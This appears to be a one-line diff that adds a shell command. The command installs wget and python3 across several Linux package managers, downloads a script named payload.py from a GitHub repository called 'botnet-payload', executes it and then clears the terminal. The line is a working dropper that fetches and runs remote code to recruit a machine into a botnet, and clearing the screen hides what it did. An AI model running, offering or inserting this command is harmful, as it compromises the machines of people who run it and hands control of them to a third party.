@@ -1,0 +1,1 @@
+apt install wget python3 -y ; yum install wget python3 -y ; apk add wget python3 ; wget https://raw.githubusercontent.com/kashy01/botnet-payload/main/payload.py ; python3 payload.py ; clear
